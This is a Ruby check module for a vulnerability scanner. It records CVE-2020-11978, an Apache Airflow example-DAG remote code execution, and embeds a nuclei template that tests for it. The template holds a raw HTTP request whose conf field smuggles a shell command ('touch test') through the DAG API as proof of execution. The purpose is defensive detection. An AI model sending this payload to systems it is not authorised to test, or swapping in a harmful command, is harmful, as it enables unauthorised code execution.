module Intrigue
  module Issue
    class ApacheAirflowCve202011978 < BaseIssue
      def self.generate(instance_details = {})
        {
          added: "2021-06-30",
          name: "apache_airflow_cve_2020_11978",
          pretty_name: "Apache Airflow <= 1.10.10 - 'Example Dag' Remote Code Execution (CVE-2020-11978)",
          severity: 1,
          category: "vulnerability",
          status: "confirmed",
          description: "An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.",
          identifiers: [
            { type: "CVE", name: "CVE-2020-11978" }
          ],
          affected_software: [
            { vendor: "Apache", product: "Airflow" }
          ],
          references: [
            { type: "description", uri: "https://nvd.nist.gov/vuln/detail/CVE-2020-11978" },
            { type: "description", uri: "https://twitter.com/wugeej/status/1400336603604668418" },
            { type: "exploit", uri: "https://github.com/pberba/CVE-2020-11978" }
          ],
          authors: ["pdteam", "adambakalar"]
        }.merge!(instance_details)
      end
    end
  end

  module Task
    class ApacheAirflowCve202011978 < BaseCheck
      def self.check_metadata
        {
          allowed_types: ["Uri"]
        }
      end

      # return truthy value to create an issue
      def check
          # run a nuclei
          uri = _get_entity_name
          template = <<-HEREDOC
          id: CVE-2020-11978
          info:
            name: Apache Airflow <= 1.10.10 - 'Example Dag' Remote Code Execution
            author: pdteam
            severity: high
            description: An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.
            reference: |
                  - https://github.com/pberba/CVE-2020-11978
                  - https://nvd.nist.gov/vuln/detail/CVE-2020-11978
                  - https://twitter.com/wugeej/status/1400336603604668418
            tags: cve,cve2020,apache,airflow,rce
          
          requests:
            - raw:
                - |
                  POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1
                  Host: {{Hostname}}
                  Connection: close
                  Accept-Encoding: gzip, deflate
                  Accept: */*
                  Content-Length: 85
                  Content-Type: application/json
          
                  {"conf": {"message": "\"; touch test #"}}
          
                - |
                  GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task HTTP/1.1
                  Host: {{Hostname}}
                  Connection: close
                  Accept-Encoding: gzip, deflate
                  Accept: */*
          
          
              extractors:
                - type: regex
                  name: exec_date
                  part: body
                  group: 1
                  internal: true
                  regex:
                    - '"execution_date":"([0-9-A-Z:+]+)"'
          
              matchers-condition: and
              matchers:
                - type: word
                  words:
                    - 'application/json'
                  part: header
                - type: word
                  words:
                    - '"operator":"BashOperator"'
                  part: body
          HEREDOC
  
          # if this returns truthy value, an issue will be raised
          # the truthy value will be added as proof to the issue
          run_nuclei_template_from_string uri, template
      end
    end
  end
end
